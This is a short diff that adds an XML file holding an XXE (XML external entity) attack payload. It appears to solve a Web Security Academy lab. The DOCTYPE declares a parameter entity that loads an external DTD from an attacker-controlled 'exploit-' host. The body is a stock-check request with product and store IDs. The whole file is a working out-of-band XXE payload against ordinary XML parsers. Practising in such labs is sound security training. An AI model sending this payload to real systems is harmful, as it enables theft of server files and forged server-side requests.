@@ -1,0 +1,9 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE vuln [
+    <!ENTITY % lookup SYSTEM "https://exploit-0a0100930372ad83c0b8120a0157008e.web-security-academy.net/exploit">
+    %lookup;
+]>
+<stockCheck>
+    <productId>5</productId>
+    <storeId>1</storeId>
+</stockCheck>
